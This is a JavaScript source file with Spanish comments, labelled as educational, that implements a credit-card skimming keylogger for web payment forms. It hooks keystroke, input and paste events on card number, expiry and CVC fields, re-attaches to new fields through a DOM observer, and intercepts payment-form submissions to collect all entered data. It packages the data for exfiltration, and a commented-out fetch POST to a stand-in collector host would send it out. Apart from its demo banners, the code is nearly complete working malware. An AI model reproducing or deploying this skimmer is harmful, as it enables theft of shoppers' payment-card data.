// Keylogger para campos específicos de tarjeta de crédito
// ⚠️ SOLO PARA PROPÓSITOS EDUCATIVOS Y TESTING ⚠️

(function () {
  "use strict";

  // Buffer para almacenar las pulsaciones
  let keylogBuffer = {
    cc_number: [],
    cc_exp: [],
    cc_cvc: [],
  };

  // Función para registrar pulsaciones
  function logKeyStroke(fieldName, event) {
    const keystrokeData = {
      field: fieldName,
      key: event.key,
      keyCode: event.keyCode,
      value: event.target.value,
      timestamp: new Date().toISOString(),
      type: event.type,
    };

    // Agregar al buffer específico del campo
    keylogBuffer[fieldName].push(keystrokeData);

    // Log en consola para debugging
    console.log(`[KEYLOGGER] ${fieldName}:`, keystrokeData);

    // Enviar datos cada 5 pulsaciones (simulación)
    if (keylogBuffer[fieldName].length % 5 === 0) {
      exfiltrateData(fieldName, keylogBuffer[fieldName]);
    }
  }

  // Función para simular exfiltración de datos
  function exfiltrateData(fieldName, data) {
    const payload = {
      field: fieldName,
      keystrokes: data,
      sessionId: generateSessionId(),
      userAgent: navigator.userAgent,
      url: window.location.href,
      timestamp: new Date().toISOString(),
    };

    // Simular envío a servidor malicioso
    console.log(`[EXFILTRATION] Enviando datos de ${fieldName}:`, payload);

    // En un ataque real, esto sería algo como:
    // fetch('https://evil-collector.example.com/keylog', {
    //     method: 'POST',
    //     body: JSON.stringify(payload)
    // });

    // Para demo, solo mostrar en consola
    displayCapturedData(fieldName, payload);
  }

  // Generar ID de sesión único
  function generateSessionId() {
    return "session_" + Math.random().toString(36).substr(2, 9);
  }

  // Mostrar datos capturados en la página (para demo)
  function displayCapturedData(fieldName, data) {
    let displayDiv = document.getElementById("keylog-display");
    if (!displayDiv) {
      displayDiv = document.createElement("div");
      displayDiv.id = "keylog-display";
      displayDiv.style.cssText = `
                position: fixed;
                top: 10px;
                right: 10px;
                width: 300px;
                max-height: 400px;
                overflow-y: auto;
                background: rgba(255,0,0,0.9);
                color: white;
                padding: 10px;
                border-radius: 5px;
                font-size: 12px;
                z-index: 9999;
                font-family: monospace;
            `;
      displayDiv.innerHTML = "<strong>🔴 KEYLOGGER ACTIVO</strong><br>";
      document.body.appendChild(displayDiv);
    }

    const entry = document.createElement("div");
    entry.style.cssText =
      "border-bottom: 1px solid #fff; margin: 5px 0; padding: 5px 0;";
    entry.innerHTML = `
            <strong>${fieldName}:</strong><br>
            Keys: ${data.keystrokes.map((k) => k.key).join("")}<br>
            Value: ${
              data.keystrokes[data.keystrokes.length - 1]?.value || ""
            }<br>
            <small>${new Date().toLocaleTimeString()}</small>
        `;
    displayDiv.appendChild(entry);

    // Limitar entradas mostradas
    if (displayDiv.children.length > 10) {
      displayDiv.removeChild(displayDiv.children[1]);
    }
  }

  // Instalar keyloggers en campos específicos
  function installKeyloggers() {
    const targetFields = ["cc_number", "cc_exp", "cc_cvc"];

    targetFields.forEach((fieldName) => {
      // Buscar el campo por name
      const field = document.querySelector(`input[name="${fieldName}"]`);

      if (field) {
        console.log(`[KEYLOGGER] Instalando keylogger en: ${fieldName}`);

        // Eventos de teclado
        field.addEventListener("keydown", (e) => logKeyStroke(fieldName, e));
        field.addEventListener("keyup", (e) => logKeyStroke(fieldName, e));
        field.addEventListener("keypress", (e) => logKeyStroke(fieldName, e));

        // Eventos de input y cambio
        field.addEventListener("input", (e) => logKeyStroke(fieldName, e));
        field.addEventListener("change", (e) => logKeyStroke(fieldName, e));

        // Eventos de paste
        field.addEventListener("paste", (e) => {
          setTimeout(() => {
            logKeyStroke(fieldName, {
              ...e,
              key: "PASTE",
              type: "paste",
            });
          }, 10);
        });

        // Marcar como interceptado
        field.dataset.keyloggerInstalled = "true";
      } else {
        console.warn(`[KEYLOGGER] Campo no encontrado: ${fieldName}`);
      }
    });
  }

  // Monitorear cambios en el DOM para campos dinámicos
  function monitorDOMChanges() {
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        if (mutation.addedNodes) {
          mutation.addedNodes.forEach((node) => {
            if (node.nodeType === Node.ELEMENT_NODE) {
              // Buscar nuevos campos de tarjeta
              const newFields = node.querySelectorAll(
                'input[name="cc_number"], input[name="cc_exp"], input[name="cc_cvc"]'
              );
              if (newFields.length > 0) {
                console.log(
                  "[KEYLOGGER] Nuevos campos detectados, reinstalando..."
                );
                setTimeout(installKeyloggers, 100);
              }
            }
          });
        }
      });
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true,
    });
  }

  // Capturar datos del formulario al enviar
  function interceptFormSubmit() {
    document.addEventListener("submit", function (e) {
      const form = e.target;
      if (
        form.id === "payment-form" ||
        form.querySelector('input[name="cc_number"]')
      ) {
        console.log("[KEYLOGGER] Interceptando envío de formulario...");

        // Capturar todos los datos del formulario
        const formData = new FormData(form);
        const allData = {};
        for (let [key, value] of formData.entries()) {
          allData[key] = value;
        }

        // Combinar con keylog data
        const completePayload = {
          formData: allData,
          keylogData: keylogBuffer,
          submitTime: new Date().toISOString(),
          userAgent: navigator.userAgent,
          url: window.location.href,
        };

        console.log("[KEYLOGGER] Datos completos capturados:", completePayload);
        exfiltrateData("FORM_SUBMIT", [completePayload]);
      }
    });
  }

  // API para acceso externo (debugging)
  window.KeyloggerAPI = {
    getBuffer: () => keylogBuffer,
    clearBuffer: () => {
      keylogBuffer = { cc_number: [], cc_exp: [], cc_cvc: [] };
      console.log("[KEYLOGGER] Buffer limpiado");
    },
    exportData: () => {
      const blob = new Blob([JSON.stringify(keylogBuffer, null, 2)], {
        type: "application/json",
      });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = "keylog_data.json";
      a.click();
    },
  };

  // Inicialización
  function init() {
    console.log("[KEYLOGGER] 🔴 INICIANDO KEYLOGGER DE TARJETAS DE CRÉDITO");
    console.log("[KEYLOGGER] ⚠️ SOLO PARA PROPÓSITOS EDUCATIVOS");

    // Esperar a que el DOM esté listo
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", () => {
        installKeyloggers();
        monitorDOMChanges();
        interceptFormSubmit();
      });
    } else {
      installKeyloggers();
      monitorDOMChanges();
      interceptFormSubmit();
    }

    // Mostrar advertencia visual
    setTimeout(() => {
      if (document.body) {
        const warning = document.createElement("div");
        warning.style.cssText = `
                    position: fixed;
                    bottom: 10px;
                    left: 10px;
                    background: red;
                    color: white;
                    padding: 10px;
                    border-radius: 5px;
                    font-weight: bold;
                    z-index: 9999;
                `;
        warning.textContent = "🔴 KEYLOGGER ACTIVO - DEMO EDUCATIVO";
        document.body.appendChild(warning);
      }
    }, 1000);
  }

  // Ejecutar con pequeño delay
  setTimeout(init, Math.random() * 1000);
})();
